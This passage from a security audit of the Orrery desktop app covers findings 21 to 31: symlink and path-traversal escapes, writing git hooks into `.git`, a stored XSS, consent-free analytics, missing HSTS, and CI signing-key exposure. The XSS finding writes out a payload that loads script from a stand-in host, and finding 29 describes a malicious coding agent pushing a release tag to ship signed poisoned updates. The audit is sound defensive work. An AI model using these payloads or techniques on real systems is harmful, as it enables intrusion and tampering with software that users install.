`r.read_line(&mut line)` into a heap String with no line-length or header-count limit, so a client that streams bytes without a newline grows that String indefinitely, pre-auth, with no Content-Length involved. Severity stays medium: per the brief, DoS of the app is medium.</sub>

### 21. safe_join is purely lexical — a repo-supplied symlink escapes the worktree guard it documents

`src-tauri/src/agents/fs_commands.rs:17-33` — path-traversal _(downgraded on verification)_

**Actor.** T2 (malicious repository added as a project / checked out into an agent worktree) · **Precondition.** The user adds or clones a repo containing a symlink (e.g. `notes -> /home/user/.ssh` or `docs -> /`), then browses/opens/saves a file under it in Orrery's tree and editor. On Windows this needs developer mode or a repo cloned with symlink support; on macOS/Linux it is unconditional.

**Impact.** Every file command the module claims is worktree-confined (file_write, file_create, dir_create, file_rename, file_delete, file_read_binary, file_open_external, file_reveal) operates outside the worktree: read arbitrary files into the UI, overwrite arbitrary files with editor content, recursively delete an arbitrary directory, or hand an arbitrary path to the OS default handler.

**How it breaks.** safe_join inspects only the textual components of `rel` and then joins (fs_commands.rs:26-32); it never canonicalizes, so a Normal component that is a symlink on disk resolves outside the worktree. A repo checked out into a project or worktree can ship `notes -> /home/user/.ssh/id_rsa`: the tree lists it as a leaf (fs/mod.rs:70 reports is_dir()==false for symlinks, so nothing is traversed), opening it calls file_read_binary whose std::fs::read follows the link, and saving calls file_write whose std::fs::write overwrites the target. A caller that chooses the string can also pass `link/sub/path` to reach anything below a symlinked directory, including remove_dir_all on a real directory under it.

  ```
  fs_commands.rs:26      for c in p.components() {
  fs_commands.rs:28          Component::Normal(_) | Component::CurDir => {}
  fs_commands.rs:32      Ok(workdir.join(p))
  fs/mod.rs:70      let is_dir = entry.file_type().map(|t| t.is_dir()).unwrap_or(false);
  fs/mod.rs:75      let children = if is_dir && recurse && !ignored {
  ```

**Fix.** After joining, canonicalize both workdir and target (std::fs::canonicalize / dunce) and reject anything not under the canonical workdir; use symlink_metadata on read/write/delete so a link is never followed, and mark symlink entries in fs::scan so the UI does not present them as ordinary files.

<sub>Verifier: The lexical-only guard is real: safe_join (fs_commands.rs:16-32) checks components then `Ok(workdir.join(p))` with no canonicalization, while the module header (fs_commands.rs:2-4) claims a command "can never escape the agent's worktree" and the test at fs_commands.rs:319-327 only covers `..`/absolute/drive prefixes. But the cited mechanism is wrong and the impact overstated. std::fs::DirEntry::file_type() does NOT follow symlinks, so at fs/mod.rs:70 a symlinked directory reports is_dir()==false and the recursion at fs/mod.rs:75-77 never walks it — a repo shipping `docs -> /` shows up as one leaf node, not as an arbitrary filesystem in the tree. delete_path's remove_dir_all (fs_commands.rs:88) also refuses a top-level symlink (std opens O_NOFOLLOW|O_DIRECTORY), so "recursively delete an arbitrary directory" needs a caller-crafted `link/subdir` string, not a click. What remains: under T2 the user clicks the symlink leaf and file_read_binary/file_write follow it (a repo-supplied `notes -> ~/.ssh/id_rsa` is read into the editor and overwritten on save) — no exfiltration; under T5/XSS the escape works but that actor already has ipc-surface-01 and -05, which need no symlink. Bounded impact plus hostile-repo-and-user-interaction precondition: medium.</sub>

### 22. safe_join permits `.git/**`, so the worktree-confined file CRUD can install a git hook that the app's own CLI git operations then execute

`src-tauri/src/agents/fs_commands.rs:26` — path-guard-scope _(added by verifier)_

**Actor.** T5 (compromised frontend package) or any future webview compromise — the caller of invoke. · **Precondition.** One project row exists, so file_write resolves through project_pseudo_record to the repository root where `.git` is a real directory (in a linked agent worktree `.git` is a file, so create_dir_all fails there). The user then performs any push/pull from the UI — or the payload targets a hook git runs on its own next network op.

**Impact.** Turns the one write primitive the module actually guards into code execution as the user, and it survives the fix for ipc-surface-01/02/05: even a fully canonicalizing safe_join still allows `.git/hooks/pre-push`, because that path is genuinely inside the worktree. The hook then runs with the user's environment and credentials on the next agent_push / project_pull.

**How it breaks.** safe_join only rejects absolute paths, drive prefixes and non-Normal components (fs_commands.rs:20-32); nothing excludes the `.git` directory, and write_file creates missing parents (fs_commands.rs:42-45). The file tree hides `.git` (`if name == ".git" { continue; }`, fs/mod.rs:62), so the surface looks worktree-only, but a caller can name it directly. file_write(project_id, ".git/hooks/pre-push", "#!/bin/sh\n<payload>") lands the file; GitBackend::push shells out to the system git in that checkout (`cmd.current_dir(worktree).args(["push","-u",remote,branch])`, git/backend.rs:202-206) and pull_ff likewise (backend.rs:220-224), and both run the repository's hooks. The exec bit matters on Unix and file_write does not set it, so the reliable variants there are hooks git invokes through a shell wrapper or, on Windows, any `.git/hooks/pre-push` script; the cleanest cross-platform variant is overwriting `.git/config` to set `core.hooksPath` or a `[core] pager`/`sshCommand` value that git executes.

  ```
  fs_commands.rs:26      for c in p.components() {
  fs_commands.rs:28              Component::Normal(_) | Component::CurDir => {}
  fs_commands.rs:32      Ok(workdir.join(p))
  fs/mod.rs:62          if name == ".git" {
  git/backend.rs:204          cmd.current_dir(worktree).args(["push", "-u", remote, branch]);
  ```

**Fix.** Reject any `rel` whose first component is `.git` (case-insensitively, plus the `.git` file itself) in safe_join, and mirror the same refusal in the GitBackend methods that take a worktree-relative path; the editor has no legitimate reason to write into the repository's metadata directory.

### 23. agent_remove renames the target directory before validating the id, so a PROJECT id moves the user's repository aside via the pseudo-agent fallback

`src-tauri/src/agents/service.rs:733-776` — authz-access _(downgraded on verification)_

**Actor.** T5/XSS in the webview; also any frontend bug that passes a project-tab id where an agent id is expected · **Precondition.** A project row exists. The id is not in the `agents` table, so `record()` falls through to project_pseudo_record, whose `worktree` field is the user's real repository path.

**Impact.** `agent_remove(id = <project uuid>, hard = true)` renames the user's entire project repository directory to `<repo>.trash-<ts>` before the guard that would have rejected the id fires; `agent_merge_abort(<project uuid>)` hard-resets the user's main checkout to HEAD; `agent_discard`/`agent_hunk_revert`/`file_delete` likewise act on the project checkout. The 'hard delete is opt-in and agent-scoped' contract stated at agents/commands.rs:76-79 does not hold.

**How it breaks.** AgentService::record falls back to project_pseudo_record (service.rs:733), returning worktree = the project's repository path (service.rs:757-762). remove() renames that path to a `.trash-<ts>` sibling at service.rs:417-423 before any check that the agents row exists; the `if n == 0 { return Err(NotFound) }` at service.rs:441-443 fires afterwards, so the rename stands, the projects row points at a path that no longer exists, and the frontend's own comment (agent-actions.service.ts:307-309, "the backend aborts before touching git or the database") is false for this id. The background purge is skipped because it lives after the early return, so the data is recoverable unless the repo sits directly inside a swept worktree root.

  ```
  agents/service.rs:733              None => self.project_pseudo_record(id),
  agents/service.rs:406          let rec = self.record(id).ok();
  agents/service.rs:417              if wt_path.exists() {
  agents/service.rs:419                  rename_retry(wt_path, &aside).map_err(|e| {
  agents/service.rs:441          if n == 0 {
  agents/service.rs:442              return Err(AgentError::NotFound(id.to_string()).into());
  ```

**Fix.** Verify the agents row exists before the rename in AgentService::remove; more generally split record() into a record_readonly(id) used by the project-tab read/CRUD/shell commands the pseudo record documents, and a strict agents-table lookup used by every destructive command.

<sub>Verifier: Mechanism confirmed: record() falls back to project_pseudo_record for a non-agent id (agents/service.rs:733), the pseudo record's `worktree` is the project's own path (service.rs:757-762), and remove() renames that directory aside at service.rs:417-423 BEFORE the DELETE row-count check that returns NotFound at service.rs:441-443. Three corrections cut severity. (1) The pseudo record is deliberate for project tabs and its doc (service.rs:734-741) sanctions tree/changes/diff/blame/file-CRUD/search/commits/shell — so agent_discard, agent_merge_abort and file_delete operating on the project checkout are plausibly the intended project-tab behaviour, not the break. (2) The claimed permanent destruction does not occur: `purge_in_background(aside)` sits at service.rs:444-446, AFTER the `return Err(NotFound)`, so the repo is renamed to `<repo>.trash-<ts>` and left recoverable; sweep_trash (service.rs:476-495) only walks the two worktree ROOTS, so a project repo outside them is never purged. (3) The UI resolves the id from the agents list (agents/agent-actions.service.ts:296-306), so only a caller already choosing arbitrary invoke arguments reaches it — the same actor that holds ipc-surface-01.</sub>

### 24. agent_dir / project_dir enumerate any directory on the machine (unvalidated `path`)

`src-tauri/src/fs/mod.rs:50-38` — path-traversal

**Actor.** T5/XSS in the webview · **Precondition.** Any agent or project id that resolves to a git worktree (list_dir returns empty for a non-git root).

**Impact.** Full recursive-by-request enumeration of the user's filesystem from the renderer: home directory contents, other projects, ~/.ssh, %APPDATA%. Reconnaissance that pairs with ipc-surface-05 (read any listed file) and ipc-surface-01 (write to any discovered path).

**How it breaks.** agent_dir (agents/commands.rs:630-642) and project_dir (projects/commands.rs:130-139) take `path: String` from the invoke payload and pass it to fs::list_dir, which joins it onto the repo workdir (fs/mod.rs:35-37 → scan's `workdir.join(rel)` at fs/mod.rs:50) with no component check. `path = "../../../.."` walks up out of the worktree; `path = "/etc"` or `"C:\\Users"` replaces the base entirely. Each returned FileNode carries the escaped relative path, which the caller can feed straight back into agent_diff.

  ```
  agents/commands.rs:633      path: String,
  agents/commands.rs:637      Ok(crate::fs::list_dir(
  fs/mod.rs:35      let workdir = ignore.workdir().to_path_buf();
  fs/mod.rs:37      scan(ignore.as_ref(), &workdir, rel, false, &mut count)
  fs/mod.rs:50          workdir.join(rel)
  ```

**Fix.** Guard `rel` in fs::list_dir with the same lexical+canonical check used for file writes, and return an error rather than an empty vec on rejection.

<sub>Verifier: agent_dir (agents/commands.rs:629-643) and project_dir (projects/commands.rs:128-140) hand `path: String` straight to crate::fs::list_dir, which takes the ignore matcher's workdir (fs/mod.rs:31-37) and calls scan, whose only path handling is `workdir.join(rel)` at fs/mod.rs:46-50 — no component check, so `../../..` walks up and an absolute path replaces the base. Each FileNode carries the escaped relative path (fs/mod.rs:64-68), which feeds straight back into agent_diff. Read-only reconnaissance primitive; medium is right.</sub>

### 25. GitBackend file_diff / file_hunks / revert_hunk / working_blame join the worktree with an unvalidated caller path (arbitrary read, file truncation)

`src-tauri/src/git/gix_backend.rs:2315-300` — path-traversal

**Actor.** T5/XSS in the webview · **Precondition.** Any agent or project id resolves. For the write variant the target file must be readable and not have a HEAD blob under that name (an untracked/outside path never does).

**Impact.** agent_diff returns the full text of any file the user can read (`new` field) — SSH keys, tokens, ~/.aws/credentials. agent_hunk_revert splices HEAD bytes over the working region; for a path with no HEAD blob the HEAD side is empty, so the whole file content can be removed — silent destruction of a file outside the worktree.

**How it breaks.** agent_diff passes `path` to GitBackend::file_diff, which does `std::fs::read_to_string(worktree.join(rel))` with no guard (gix_backend.rs:2315); `../../../..`-style and absolute paths both escape (Path::join replaces on absolute). agent_file_hunks does the same read (gix_backend.rs:2327) and agent_hunk_revert writes back to `worktree.join(rel)` after computing hunks against an empty HEAD blob (gix_backend.rs:2346-2352). The contrast is explicit inside the repo: search/mod.rs:241 says "paths come from our own scan results, but never trust them with the FS" and guards them; the git command surface does not.

  ```
  agents/commands.rs:288      path: String,
  git/gix_backend.rs:2315      let new = std::fs::read_to_string(worktree.join(rel)).unwrap_or_default();
  git/gix_backend.rs:2327      let work = to_git_eol(&repo, std::fs::read(worktree.join(rel)).unwrap_or_default());
  git/gix_backend.rs:2348      let abs = worktree.join(rel);
  ```

**Fix.** Validate `rel` inside the GitBackend methods that take a worktree-relative path (file_diff gix_backend.rs:2308, file_hunks 2322, revert_hunk 2333, working_blame 2230) with the same lexical guard as agents::fs_commands::safe_join plus canonicalization, or reject at the command boundary in agents/commands.rs:284, git/hunks.rs:19 and git/hunks.rs:36.

<sub>Verifier: All three sinks verified. agent_diff (agents/commands.rs:284-296) → GitBackend::file_diff does `let new = std::fs::read_to_string(worktree.join(rel)).unwrap_or_default();` (gix_backend.rs:2315) with no guard; an absolute path replaces the base, `..` is unchecked. file_hunks reads the same way (gix_backend.rs:2327) and revert_hunk writes back to `worktree.join(rel)` (gix_backend.rs:2348) against an empty HEAD blob for a path with no HEAD entry, so one revert removes the whole body. Location correction: agent_file_hunks and agent_hunk_revert are declared in src-tauri/src/git/hunks.rs:19-52, not agents/commands.rs:288. One further sink of the same class the finder missed: GitBackend::working_blame does `std::fs::read(workdir.join(rel))` (gix_backend.rs:2236) and returns the file's lines to the renderer through agent_working_blame (agents/commands.rs:810-825). Medium stands — the actor is the same one that already has ipc-surface-01.</sub>

### 26. changelog.html interpolates commit `type` and release `channel` into HTML unescaped; `channel` is a free-form workflow input that round-trips through the public changelog.json

`landing/changelog.html:189-196` — csp-xss

**Actor.** T5 · **Precondition.** Ability to write kouji-dev/orrery-releases/changelog.json — a compromised RELEASES_TOKEN, or anyone who can run the publish-changelog workflow_dispatch on the orrery repo.

**Impact.** Stored XSS on the production landing origin. Every other field in renderRelease is passed through esc() before concatenation; c.type (both into the class attribute and as text) and r.channel (into the class attribute) are not. r.channel is populated from the `--channel` CLI argument, which publish-changelog.yml exposes as an unconstrained workflow_dispatch string input and passes verbatim through the environment. The injected script runs on orrery.kouji.dev with no CSP to contain it (landing-privacy-03) and can rewrite the installer CTA, so this escalates directly into malware distribution.

**How it breaks.** An actor with dispatch rights (or a leaked RELEASES_TOKEN, which the same workflow hands to a git clone URL at publish-changelog.yml:52) runs Publish changelog with channel set to `beta"><script src=//evil/x.js></script><span class="`. changelog-json.mjs:91 stores it as out.channel, entryFromCommits/buildReleaseEntry copy it into the entry unmodified, and the JSON is committed and pushed to the public orrery-releases repo. changelog.html:213 fetches that raw JSON on every visit and line 196 concatenates r.channel straight into an attribute inside the string later assigned to rel.innerHTML — the quote closes the class attribute and the script tag lands in the DOM. Critically this path never touches landing/, so it does not trigger deploy-landing.yml and gets no landing-code review: the payload arrives at runtime from a different repository. c.type is currently constrained to \w+ by CONVENTIONAL_RE (gen-changelog.mjs:16), but changelog.html trusts the JSON rather than the generator, so a hand-edited or migrated entry injects through :189 the same way.

  ```
  landing/changelog.html:176  const esc = (s) => s.replace(/[&<>]/g, ...)
  landing/changelog.html:189   return '<div class="commit"><span class="c-type '+c.type+'">'+c.type+'</span>'+
  landing/changelog.html:196     '<span class="rel-badge '+r.channel+'">'+(r.channel==="beta"?"BETA":"DEV")+'</span></div>'+
  scripts/release/changelog-json.mjs:91     else if (a === "--channel") out.channel = argv[++i];
  .github/workflows/publish-changelog.yml:18       channel:
  .github/workflows/publish-changelog.yml:22         type: string
  .github/workflows/publish-changelog.yml:54    args=(append --summary "$SUMMARY" --channel "$CHANNEL" ...)
  ```

**Fix.** Build the DOM with createElement/textContent (or at minimum esc() both fields and extend esc to escape " and ' so any esc'd value is also attribute-safe), and allow-list channel to beta|stable|dev in changelog-json.mjs before it is written.

<sub>Verifier: Verified precisely. landing/changelog.html:176 defines esc as `s.replace(/[&<>]/g, ...)` — it escapes only & < > and NOT quotes. Line 189 emits `'<span class="c-type '+c.type+'">'+c.type+'</span>'` and line 196 emits `'<span class="rel-badge '+r.channel+'">'`; every other field on lines 187-201 (c.scope, c.by, c.hash, c.msg, r.tag, r.date, r.ref, r.summary) is esc'd and lands in text position, so those are safe today only by placement. Line 193 assigns the concatenation to rel.innerHTML and line 213 fetches the payload live from raw.githubusercontent.com/kouji-dev/orrery-releases/main/changelog.json, so this is runtime-injected data from a different repository that never passes through deploy-landing.yml review. The channel provenance chain checks out: changelog-json.mjs:91 `else if (a === "--channel") out.channel = argv[++i]` with no validation, buildReleaseEntry (gen-changelog.mjs:48-62) copies channel and c.type through untouched, and publish-changelog.yml:18-22/48/54 wires the unconstrained workflow_dispatch string into it. The finder's note that c.type is generator-constrained is correct — CONVENTIONAL_RE at gen-changelog.mjs:16 is /^(\w+)(?:\(([^)]*)\))?!?:\s*(.+)$/ and type is m[1].toLowerCase(), so \w+ only, and the non-matching branch hardcodes 'chore' — meaning a contributor who lands a commit subject in orrery CANNOT inject; the page nonetheless trusts the JSON rather than the generator. Two corrections to the finder's framing, neither fatal: (1) the workflow_dispatch actor is not a meaningful addition to the precondition — running it requires write access to the private orrery repo, and that same access edits landing/changelog.html directly; the actor that matters is one holding only RELEASES_TOKEN or orrery-releases write. (2) 'escalates directly into malware distribution' is overstated — that same actor already controls the release assets the CTA points at, so the XSS grants no new capability against installers. It remains a real crossing of the escaping boundary the page's own esc() asserts, with a plausible (leaked-CI-secret) precondition: medium is right.</sub>

### 27. GA4 loads and configures unconditionally — no consent gate, no DNT/GPC check, no privacy policy anywhere on the site

`landing/index.html:71-77` — privacy-telemetry

**Actor.** T6 · **Precondition.** Any visitor loads orrery.kouji.dev or /changelog.html. No further access needed.

**Impact.** gtag.js is fetched from googletagmanager.com and gtag('config','G-XJLNTCMR4P') runs in <head> before any user action, so GA4 writes its first-party identifier cookies (_ga, _ga_XJLNTCMR4P) and transmits the visitor's IP, user-agent, page URL and referrer to Google on first paint. The same block is duplicated on the changelog page. analytics.js then reports file_download, click{outbound,link_url,link_domain} and release_lookup{version} for every click. grep over landing/ finds no occurrence of 'consent', 'cookie', 'DNT', 'doNotTrack' or 'privacy' — there is no consent banner, no GA4 Consent Mode default state, no navigator.doNotTrack / Sec-GPC check, no anonymize_ip, and no privacy-policy page or footer link (landing/index.html:462-469 footer links are Product / How it works / Changelog / GitHub / Releases only).

**How it breaks.** An EU/UK visitor arrives; index.html:71 loads gtag.js and index.html:76 fires config, which sets a persistent client-identifier cookie and sends a page_view hit to Google Analytics before any lawful basis is established and with no way for the visitor to refuse. There is no mechanism on the site to opt out — the tracking is unconditional in the document head, not behind any flag. Because there is also no privacy policy or cookie notice, the visitor is given no notice of the collection or of the transfer to Google. The desktop app itself ships no analytics (grep for gtag/googletagmanager over src/ returns nothing), so this is the only telemetry surface and it is entirely un-gated.

  ```
  landing/index.html:70  <!-- Google tag (gtag.js) -->
  landing/index.html:71  <script async src="https://www.googletagmanager.com/gtag/js?id=G-XJLNTCMR4P"></script>
  landing/index.html:74    function gtag(){dataLayer.push(arguments);}
  landing/index.html:76    gtag('config', 'G-XJLNTCMR4P');
  landing/changelog.html:21 <script async src="https://www.googletagmanager.com/gtag/js?id=G-XJLNTCMR4P"></script>
  landing/analytics.js:16   window.track = function (name, params) { ... gtag("event", name, params || {}); };
  ```

**Fix.** Gate the gtag bootstrap behind an explicit consent choice (or at minimum set GA4 Consent Mode defaults to denied and honour navigator.doNotTrack / Sec-GPC before calling config), and publish a privacy page linked from both footers that names GA4, the cookies set, and the retention.

<sub>Verifier: Verified end to end. landing/index.html:70-77 and landing/changelog.html:20-27 are byte-identical gtag bootstraps in <head>: the async loader plus an inline gtag('js')/gtag('config','G-XJLNTCMR4P') that runs on parse, before any user action and before analytics.js. `grep -rn -i "consent|doNotTrack|Sec-GPC|privacy|anonymize_ip|cookie" landing/` returns ZERO lines — I ran it, the output is empty — so there is no Consent Mode default, no DNT/GPC check, no cookie notice and no privacy page. The footers I read (index.html:463-468 Product / How it works / Changelog / GitHub / Releases; changelog.html:162 is just a copyright line) carry no privacy link, and sitemap.xml lists only / and /changelog.html, so no privacy page exists to be unlinked. analytics.js:16-18 and :41-43 confirm the runtime events, including `link_url` of every outbound click. The claim that the desktop app ships no telemetry also holds: `grep -rn "gtag|googletagmanager|google-analytics|posthog|sentry" src/ src-tauri/src` is empty. Not refutable as a documented trade-off — nothing in the repo mentions analytics as a decision. Severity stays medium: it is a real compliance/privacy defect with no technical compromise, matching 'bounded impact'.</sub>

### 28. No HSTS on the site that hands visitors an unsigned Windows installer — first-hop downgrade rewrites the download CTA

`render.yaml:34-46` — crypto-integrity

**Actor.** T4 · **Precondition.** An attacker on the network path (hostile Wi-Fi, ISP, DNS/ARP position) and a visitor whose first contact with orrery.kouji.dev is a plain-HTTP request (typed hostname, an http:// link, or a browser that falls back from HTTPS-First).

**Impact.** render.yaml declares exactly four response headers — X-Content-Type-Options, Referrer-Policy and two Cache-Control rules — and no Strict-Transport-Security. Render's http→https redirect does not protect the first hop: the attacker answers the initial http request with a cloned page whose <orrery-download> CTA points at their own binary. Nothing downstream catches it: the release workflow signs only the Tauri *updater* payloads (release.yml:113-114 TAURI_SIGNING_PRIVATE_KEY) and does no Authenticode signing, and macOS is explicitly unsigned (release.yml:89), so the swapped installer carries no publisher identity for the OS to check. Result: arbitrary code execution on the visitor's machine under the guise of installing Orrery.

**How it breaks.** Visitor on a café network types orrery.kouji.dev. With no HSTS header ever served, the browser has no pin and issues http://orrery.kouji.dev/. The attacker returns a byte-identical copy of landing/index.html with dl-button.js's LATEST_PAGE and the version.js-resolved exe URL replaced by their own host — the page's own code sets cta.href from remote data with no host check (see landing-privacy-04), so the substitution is invisible in the markup style. The visitor clicks Download, gets an unsigned .exe, and Windows shows only a generic SmartScreen warning identical to the one the genuine unsigned installer produces, so the warning carries no signal. The whole site's purpose is installer distribution, which is exactly the case HSTS exists for.

  ```
  render.yaml:34    headers:
  render.yaml:35      - path: /*
  render.yaml:36        name: X-Content-Type-Options
  render.yaml:38      - path: /*
  render.yaml:39        name: Referrer-Policy
  render.yaml:41      - path: /*.html
  render.yaml:42        name: Cache-Control
  (no Strict-Transport-Security anywhere in render.yaml or landing/)
  ```

**Fix.** Add `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload` to render.yaml's headers for /* and submit orrery.kouji.dev to the HSTS preload list; separately, Authenticode-sign the Windows installers so a substituted binary is distinguishable.

<sub>Verifier: The header set is exactly as claimed — render.yaml:34-46 contains only X-Content-Type-Options, Referrer-Policy and two Cache-Control rules, and grep finds no Strict-Transport-Security anywhere in render.yaml or landing/. The amplifier also holds: I checked the whole bundle config and both workflows and there is no Authenticode signing at all (`grep -rn 'signtool|CERTIFICATE|codesign|notarize|APPLE_' .github/workflows/*.yml` is empty; src-tauri/tauri.conf.json's bundle.windows block is only a wix upgradeCode/template, no certificateThumbprint or signCommand), and release.yml:89 comments the macOS target as 'unsigned (no Apple identity yet)'. One correction to the finder's impact statement, which overstates the blast radius: TAURI_SIGNING_PRIVATE_KEY at release.yml:111-112 plus tauri.conf.json:46-50 (updater endpoint on github.com + minisign pubkey) means the auto-update path IS signature-verified, so a first-hop downgrade can only poison the FIRST install, not subsequent updates. That is still the landing site's entire job. Kept at medium rather than upgraded, because the precondition (on-path attacker AND a plaintext first hop that survives modern HTTPS-First upgrade) is genuinely narrow, and rather than downgraded to low because the payload is an unsigned executable the visitor is invited to run.</sub>

### 29. No approval gate between a `v*` tag push and a signed, auto-installed release

`.github/workflows/release.yml:11-13` — ci-pipeline _(downgraded on verification)_

**Actor.** T1 (a malicious agent running in an Orrery worktree on the maintainer's machine, holding the user's git credentials by design); T5 reaches the same outcome via a compromised build-time dependency · **Precondition.** The agent runs on a machine whose git credential helper can push to kouji-dev/orrery. The committed build output proves the maintainer builds Orrery from inside an Orrery worktree: src-tauri/target-test/debug/deps/*.d records the build path C:\Users\narut\AppData\Roaming\com.kouji.orrery\worktrees\prepare_for_v1\src-tauri\target-test.

**Impact.** A signed, valid-minisign update is published to the public kouji-dev/orrery-releases and installed by every Orrery user's auto-updater. The attacker never touches the signing key — CI applies it for them. This is silent tampering of what users install, reached from the machine the app itself invites agents onto.

**How it breaks.** The agent stamps package.json to 0.22.3, commits poisoned src-tauri/src, and pushes HEAD plus tag v0.22.3 (exactly what scripts/release/bump.mjs:55 does). release.yml:12-13 fires on the tag. prepare (release.yml:59-69) only checks that the tag matches package.json — both attacker-controlled — so it passes. build checks out needs.prepare.outputs.sha and runs `pnpm tauri build` with TAURI_SIGNING_PRIVATE_KEY (release.yml:111-115), producing installers plus .sig files. publish (release.yml:172-181) uploads them and latest.json to the public releases repo with RELEASES_TOKEN. tauri.conf.json:47-50 points every installed client at that latest.json with the matching pubkey, so the signature verifies. No job declares `environment:` (grep for `environment:` across .github/workflows returns nothing), there is no CODEOWNERS and no .github config other than the four workflow files, so no human ever reviews or approves the artifact between push and publish.

  ```
  release.yml:11-13
    on:
      push:
        tags: ["v*"]
  release.yml:111-115
          env:
            TAURI_SIGNING_PRIVATE_KEY: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY }}
            TAURI_SIGNING_PRIVATE_KEY_PASSWORD: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY_PASSWORD }}
          run: pnpm tauri build
  ```

**Fix.** Put the build and publish jobs behind a GitHub `environment:` with a required reviewer so the signing key is only reachable after a human approves the specific tag/SHA, and protect the v* tag namespace with a ruleset so an unattended push cannot create a release tag.

<sub>Verifier: Facts all verified: release.yml:11-13 fires on `push: tags: ["v*"]`; the ver step (release.yml:62-69) only compares github.ref_name to package.json, both attacker-supplied; release.yml:113-115 applies TAURI_SIGNING_PRIVATE_KEY; release.yml:172-181 publishes to the public releases repo; `grep -rn "environment:" .github/` returns nothing and `ls -la .github/` shows only `workflows/` (no CODEOWNERS, no ruleset file, no dependabot config). So the pipeline genuinely has no human gate between a tag push and a signed, auto-installed update.

Downgraded from high because no boundary the app *claims* to enforce is crossed and the marginal capability gain is smaller than stated. The precondition is push access to kouji-dev/orrery. An actor with that access can already land poisoned code on main, which ships signed in the maintainer's very next intentional `pnpm release`. The approval gate would not stop that; it only removes the *unattended and immediate* path and adds a detection signal (an approval request for a version the maintainer did not intend). That is a real control and the fix is right, but it is a missing defence rather than a bypassed one — and the audit's own trade-off list already accepts that agents hold the user's git credentials. Note also that the same actor gets shell in the prepare job for free via the unquoted `${{ github.ref_name }}` at release.yml:64 (see secrets-ci-repo-hygiene-missed-02), so tag-push access is broadly equivalent to CI code execution with or without the gate.</sub>

### 30. Third-party actions pinned to mutable refs (`@stable`, `@v2`) in the job holding the signing key

`.github/workflows/release.yml:96-109` — supply-chain-cve _(downgraded on verification)_

**Actor.** T5 — a compromised third-party action repository or the account that owns it · **Precondition.** Compromise of dtolnay/rust-toolchain, swatinem/rust-cache or pnpm/action-setup, or of the tag/branch those refs resolve to. `@stable` is a branch, so it can be repointed at any commit without even a tag move.

**Impact.** Arbitrary code in the release build job. It can tamper with the compiled binary before `tauri build` signs it, or read TAURI_SIGNING_PRIVATE_KEY out of the build step it primes — either way producing a validly signed malicious update that every installed client accepts.

**How it breaks.** release.yml:106 resolves `dtolnay/rust-toolchain@stable` at run time; a branch ref gives the action owner (or anyone who compromises that repo) unilateral control of what executes on the runner. The action runs before the `pnpm tauri build` step at release.yml:111-115, in the same job and the same workspace, so it can drop a cargo config, wrap rustc, or write into src-tauri before the signed build happens. swatinem/rust-cache@v2 (release.yml:107) additionally restores compiler output into that build from a cache. Nothing verifies the produced binary against source afterwards — publish (release.yml:172-181) uploads whatever landed in dist-release/.

  ```
  release.yml:96-109
        - uses: pnpm/action-setup@v6
          with:
            version: 11
        - uses: actions/setup-node@v6
        - uses: dtolnay/rust-toolchain@stable
        - uses: swatinem/rust-cache@v2
  ```

**Fix.** Pin every third-party action to a full commit SHA (`dtolnay/rust-toolchain@<sha> # stable`) and enable the repository setting that restricts actions to SHA-pinned/allow-listed ones; first-party actions/* should be SHA-pinned too.

<sub>Verifier: Locations verified verbatim — release.yml:96 `pnpm/action-setup@v6`, :102 `actions/setup-node@v6`, :106 `dtolnay/rust-toolchain@stable`, :107 `swatinem/rust-cache@v2`, all in the job that carries TAURI_SIGNING_PRIVATE_KEY at :113-114. `@stable` is indeed a branch in dtolnay/rust-toolchain, so it is repointable without a tag move. Real gap, correct fix.

Downgraded from high because the marginal risk reduction from SHA-pinning is bounded here: the very next steps in the same job run `pnpm install --frozen-lockfile` (release.yml:110) and `pnpm tauri build` (release.yml:115), which execute thousands of lines of third-party npm install scripts (pnpm-workspace.yaml:6-10 pre-approves four) and every crate `build.rs` with the signing key in the process environment. A SHA-pinned action set does not close that door, so the finding is one instance of a larger unpinned-code-in-a-privileged-job problem rather than the decisive control. The genuine delta that keeps it at medium and not low: a branch ref can be silently repointed with no lockfile or version change, which is strictly worse than a version-pinned dependency.</sub>

### 31. The minisign updater key is in the environment of the whole build, so every crate build.rs and npm lifecycle script in the release build can read it

`.github/workflows/release.yml:111` — supply-chain _(added by verifier)_

**Actor.** T5 — a compromised crate or npm package anywhere in the transitive dependency graph of the desktop app · **Precondition.** Any dependency with a `build.rs` or an approved install script is compromised. pnpm-workspace.yaml:6-10 pre-approves install scripts for @parcel/watcher, esbuild, lmdb and msgpackr-extract, and every crates.io `build.rs` in the src-tauri graph runs unconditionally under `cargo build`, which `pnpm tauri build` invokes.

**Impact.** Permanent, unrevocable compromise of the updater signing identity. Unlike a stolen GITHUB_TOKEN, the minisign key cannot be rotated out from under installed clients: the matching pubkey is baked into src-tauri/tauri.conf.json:50 and compiled into every shipped binary, so until each user manually reinstalls a build carrying a new pubkey, the attacker can sign updates offline that every existing install accepts. That is silent tampering of what users run, with no revocation path.

**How it breaks.** release.yml:112-115 attaches TAURI_SIGNING_PRIVATE_KEY and TAURI_SIGNING_PRIVATE_KEY_PASSWORD to the `run: pnpm tauri build` step. Environment is inherited by the entire process tree of that step, and that tree is not just the bundler: tauri.conf.json:9 sets `"beforeBuildCommand": "pnpm build && node scripts/stage-updater-stub.mjs"`, and the cargo build underneath compiles and executes every dependency's build script and proc macro. Any one of them can read the key out of `std::env`/`process.env` and exfiltrate it, because the key is present for the whole build rather than only for the signing operation at the end. Nothing in the job constrains egress or scopes the secret to a single step.

  ```
  release.yml:111-115
        - name: Build Tauri app with signed updater artifacts
          env:
            TAURI_SIGNING_PRIVATE_KEY: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY }}
            TAURI_SIGNING_PRIVATE_KEY_PASSWORD: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY_PASSWORD }}
          run: pnpm tauri build
  
  src-tauri/tauri.conf.json:50 (the pubkey that pins clients to this key, with no rotation mechanism)
        "pubkey": "dW50cnVzdGVkIGNvbW1lbnQ6IG1pbmlzaWduIHB1YmxpYyBrZXk6..."
  
  pnpm-workspace.yaml:6-10 (install scripts pre-approved to run)
  allowBuilds:
    '@parcel/watcher': true
    esbuild: true
    lmdb: true
    msgpackr-extract: true
  ```

